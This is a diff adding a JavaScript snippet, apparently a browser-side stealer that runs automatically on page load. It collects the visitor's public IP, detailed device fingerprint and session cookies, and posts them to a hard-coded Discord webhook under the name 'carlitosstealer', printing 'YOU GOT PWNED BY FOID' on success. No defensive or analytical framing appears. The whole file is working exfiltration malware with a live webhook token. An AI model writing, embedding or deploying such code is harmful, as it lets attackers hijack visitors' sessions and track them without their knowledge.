@@ -1,0 +1,112 @@
+
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting public IP:', error);
+                return 'Unknown';
+            }
+        }
+
+        function getCookies() {
+            return document.cookie || "No cookies available";
+        }
+
+        function getDeviceInfo() {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, 
+                deviceType: /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop",
+                cookiesEnabled: navigator.cookieEnabled ? "✅ Enabled" : "❌ Disabled",
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                appVersion: navigator.appVersion,
+                deviceMemory: navigator.deviceMemory || 'Not available',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
+                screenColorDepth: window.screen.colorDepth,
+                screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
+                isTouchDevice: 'ontouchstart' in window ? "✅ Yes" : "❌ No",
+                publicIP: "", 
+                currentDateTime: new Date().toLocaleString(),
+                product: navigator.product,
+                currentURL: window.location.href,
+                availHeight: window.screen.availHeight,
+                availWidth: window.screen.availWidth,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
+                rtt: navigator.connection ? navigator.connection.rtt : 'Unknown',
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                cookies: getCookies() // Add cookies to the info
+            };
+        }
+
+        async function sendToDiscord(info) {
+            const webhookUrl = "https://discord.com/api/webhooks/1337440037440192682/2LQfmP2MbXlfobQi8btSXv_x8_LCSOdDvRr-ErklJ76yfeyYxqib71C-kZlF2NwRZQgy";
+
+            const embedMessage = {
+                username: "carlitosstealer", 
+                avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzDbaJF8enggYkhra6NB2_KgOZT5ysaEPTLg&s", 
+                embeds: [
+                    {
+                        title: "Device Information",
+                        color: 0xFFFFFF,
+                        fields: [
+                            { name: "🕰️ Time Zone", value: info.timezone, inline: true },
+                            { name: "📱 Device Type", value: info.deviceType, inline: true },
+                            { name: "🍪 Cookies Enabled", value: info.cookiesEnabled, inline: true },
+                            { name: "🌐 Browser Language", value: info.language, inline: true },
+                            { name: "🖥️ Screen Resolution", value: info.screenResolution, inline: true },
+                            { name: "💻 Platform", value: info.platform, inline: true },
+                            { name: "🌍 User Agent", value: info.userAgent, inline: true },
+                            { name: "🌐 Browser Version", value: info.appVersion, inline: true },
+                            { name: "💾 Device Memory", value: info.deviceMemory, inline: true },
+                            { name: "⚙️ Processor Cores", value: info.hardwareConcurrency, inline: true },
+                            { name: "🌈 Screen Color Depth", value: info.screenColorDepth, inline: true },
+                            { name: "📐 Screen Orientation", value: info.screenOrientation, inline: true },
+                            { name: "📱 Touch Device", value: info.isTouchDevice, inline: true },
+                            { name: "🌍 Public IP", value: info.publicIP, inline: true },
+                            { name: "🗓️ Current Date and Time", value: info.currentDateTime, inline: true },
+                            { name: "🌐 Browser Product", value: info.product, inline: true },
+                            { name: "🔗 Current Page URL", value: info.currentURL, inline: true },
+                            { name: "📏 Available Screen Height", value: info.availHeight, inline: true },
+                            { name: "📏 Available Screen Width", value: info.availWidth, inline: true },
+                            { name: "📶 Connection Type", value: info.connectionType, inline: true },
+                            { name: "⚡ Connection Speed (downlink)", value: info.downlink + " Mbps", inline: true },
+                            { name: "⏱️ RTT (Round Trip Time)", value: info.rtt + " ms", inline: true },
+                            { name: "🖥️ Window Width", value: info.windowWidth, inline: true },
+                            { name: "🖥️ Window Height", value: info.windowHeight, inline: true },
+                            { name: "🍪 Cookies", value: info.cookies, inline: false }
+                        ],
+                    }
+                ]
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embedMessage)
+                });
+
+                if (response.ok) {
+                    console.log('YOU GOT PWNED BY FOID');
+                } else {
+                    console.error('Error sending information');
+                }
+            } catch (error) {
+                console.error('Error sending information to webhook:', error);
+            }
+        }
+
+        (async function() {
+            const publicIP = await getPublicIP();
+            const deviceInfo = getDeviceInfo();
+            deviceInfo.publicIP = publicIP;
+
+            await sendToDiscord(deviceInfo);
+        })();
+    
